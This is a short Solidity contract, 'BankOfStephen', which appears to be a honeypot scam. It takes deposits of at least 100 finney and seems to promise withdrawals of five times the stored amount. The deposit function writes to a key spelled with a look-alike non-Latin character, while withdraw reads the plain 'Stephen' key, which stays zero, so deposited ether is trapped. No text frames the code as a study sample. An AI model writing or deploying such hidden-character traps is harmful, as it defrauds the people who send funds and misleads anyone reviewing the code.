pragma solidity ^0.4.24;

contract BankOfStephen {
    mapping(bytes32 => uint256) private owner;
    
    constructor() public {
        owner["Stephen"] = 0;
    }

    function deposit() public payable {
        require(msg.value >= 100 finney);
        owner["Stephеn"] = msg.value;
    }
    
    function withdraw() public {
        msg.sender.transfer(owner["Stephen"] * 5);
    }

    function() public payable {}
}